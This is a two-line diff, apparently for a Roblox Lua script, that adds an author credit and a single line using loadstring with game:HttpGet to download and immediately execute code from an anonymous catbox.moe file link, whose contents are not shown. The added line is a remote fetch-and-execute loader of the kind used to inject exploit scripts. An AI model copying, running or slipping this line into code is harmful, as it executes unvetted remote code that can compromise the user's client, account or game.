@@ -1,0 +1,2 @@
+-- By AetherCreator
+loadstring(game:HttpGet("https://files.catbox.moe/sg8bs8.txt"))()
